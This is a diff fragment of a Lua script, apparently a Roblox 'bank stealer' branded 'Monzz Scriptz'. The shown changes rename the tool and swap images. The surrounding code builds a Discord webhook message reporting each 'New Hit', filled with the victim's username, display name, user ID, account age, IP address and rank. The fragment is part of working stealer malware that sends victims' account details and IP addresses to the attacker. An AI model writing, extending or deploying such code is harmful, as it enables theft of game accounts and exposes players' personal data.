@@ -1222,14 +1222,14 @@ end
 -- Img
 local data1
 if banktiercheck == true then
-    imgs = "https://cdn.discordapp.com/attachments/1100823909009465497/1130420430361088050/its-friday-dancing.gif"
+    imgs = "https://cdn.discordapp.com/attachments/1121512295709806782/1130597250876330005/vidma_20230718_032704.gif"
 
     data1 = {
         ["content"] = ping,
         ["username"] = "Monzz Scriptz",
-        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1100823909009465497/1130420430361088050/its-friday-dancing.gif",
+        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1100823909009465497/1124473588045590578/Screenshot_20230414-055925_Gallery_1.jpg",
         ["embeds"] = { {
-            ["title"] = "**New Hit** ||With Monzz||",
+            ["title"] = "**New Hit** **Monzz Bank Stealer**",
             ["url"] = "https://discord.gg/uSgzNwHDTS",
             ["type"] = "rich",
             ["color"] = tonumber(0x2798FF),
@@ -1239,7 +1239,7 @@ if banktiercheck == true then
                 ["width"] = 420
             },
             ["fields"] = { {
-                ["name"] = "**Monzz Scriptz's Bank Stealer** :skull:",
+                ["name"] = "**Monzz Scriptz's Stealer Better** :skull:",
                 ["value"] = "```Username     : " .. username .. "\nDisplay Name : " .. fardplayer.DisplayName ..
                     "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                     " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank ..
